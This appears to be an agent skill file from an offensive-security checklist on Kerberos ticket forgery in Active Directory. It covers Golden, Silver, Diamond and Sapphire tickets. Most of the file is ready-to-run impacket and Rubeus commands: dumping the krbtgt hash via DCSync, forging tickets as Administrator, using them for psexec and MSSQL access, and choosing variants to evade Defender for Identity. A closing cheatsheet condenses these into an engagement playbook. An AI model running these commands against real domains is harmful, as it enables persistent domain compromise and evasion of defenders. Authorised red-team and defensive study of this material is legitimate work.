---
name: offensive-ticket-forgery
description: "Kerberos ticket forgery — Golden Ticket (forged TGT signed by krbtgt), Silver Ticket (forged TGS signed by service account), Diamond Ticket (modify legitimate TGT in-flight, evades MDI), Sapphire Ticket (PAC modification variant). Use after acquiring krbtgt or service account hashes for persistent post-exploitation domain access."
---

# Kerberos Ticket Forgery

Forge tickets that AD trusts. Once you have the right key material, the ticket cryptographically validates — the KDC trusts what it signed.

## Golden Ticket

Forge a TGT signed by krbtgt. Effective until krbtgt is rotated (rare; typically once on disclosure).

### Required Material

- krbtgt NT hash (from DCSync)
- Domain SID
- Domain name

```bash
# Get krbtgt hash via DCSync
impacket-secretsdump -just-dc-user 'corp/krbtgt' corp/admin@dc -hashes :<admin-hash>

# Forge
impacket-ticketer -nthash <krbtgt-NT> \
  -domain-sid S-1-5-21-1234... \
  -domain corp.local \
  Administrator

# Use
KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass dc.corp.local
```

```powershell
# Mimikatz / Rubeus
Rubeus.exe golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-... /krbtgt:<NThash> /ptt
```

## Silver Ticket

Forge a TGS for a specific service. Needs that service's account hash, but doesn't touch the DC (no event 4769 generated).

```bash
impacket-ticketer -nthash <svc-NT> \
  -domain-sid <SID> -domain corp.local \
  -spn cifs/server.corp.local \
  Administrator
```

Useful when you have a service account hash but not krbtgt. Service-specific scope but quieter.

## Diamond Ticket

Modify a legitimate TGT in-flight rather than forge from scratch. Evades MDI's "Encrypted Ticket against krbtgt without DCSync" detection.

```powershell
# Rubeus diamond — request a TGT with delegation, then modify
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512
```

The forged ticket has a real `nbf`/`renewtill`/`endtime` matching the legitimate TGT — fewer anomaly indicators.

## Sapphire Ticket

PAC-modification variant — embed forged group memberships in the PAC of a legitimately-issued ticket.

```powershell
Rubeus.exe sapphire /user:Administrator /sid:... /groups:512,520
```

Same idea as Golden, but signed against the Kerberos S2U2self path rather than direct krbtgt forgery.

## krbtgt Rotation Awareness

When defenders rotate krbtgt (twice, with delay), Golden Tickets become invalid. Check rotation state via KVNO and `pwdLastSet`:

```bash
impacket-secretsdump -just-dc-user 'corp/krbtgt' corp/admin@dc -hashes :<hash>
# Output includes pwdLastSet — recent change = recent rotation
```

If rotation has happened, mint Diamond instead.

## Service-Specific Silver Tickets

| Service | SPN |
|---|---|
| SMB / file shares | cifs/host |
| HTTP / web app | http/host |
| MSSQL | MSSQLSvc/host:port |
| LDAP | ldap/host |
| Host-level access | host/host |

```bash
# MSSQL silver ticket
impacket-ticketer -nthash <sql-svc-NT> -domain-sid <SID> \
  -domain corp.local -spn MSSQLSvc/sql.corp.local:1433 admin

# Use to authenticate to MSSQL as admin
```

## Detection

| Ticket | MDI Detection |
|---|---|
| Golden | Strong — direct krbtgt forge | Encryption mismatch + missing DCSync correlation |
| Silver | Weak — no DC interaction | Per-service log audits |
| Diamond | Moderate — reduces krbtgt indicators | PAC inconsistency detection |
| Sapphire | Moderate-low | PAC group inconsistency |

Modern MDI (Defender for Identity) primarily targets Golden patterns. Diamond/Sapphire variants reduce detection.

## Engagement Cheatsheet

```bash
# Have krbtgt hash:
impacket-ticketer -nthash <krbtgt> -domain-sid <SID> -domain corp.local Administrator
# (Persistence; valid until krbtgt rotation)

# Have service hash but not krbtgt:
impacket-ticketer -nthash <svc> -domain-sid <SID> -domain corp.local \
  -spn cifs/server admin
# Silver ticket for that service

# Want quieter:
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512

# Document: ticket type, target, validity period, MDI detection observed
```

## Key References

- "It's All About Trust" (Will Schroeder)
- Mimikatz / Rubeus golden/silver/diamond docs
- "Defending Against the Diamond Ticket" research
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/ticket-forgery.md
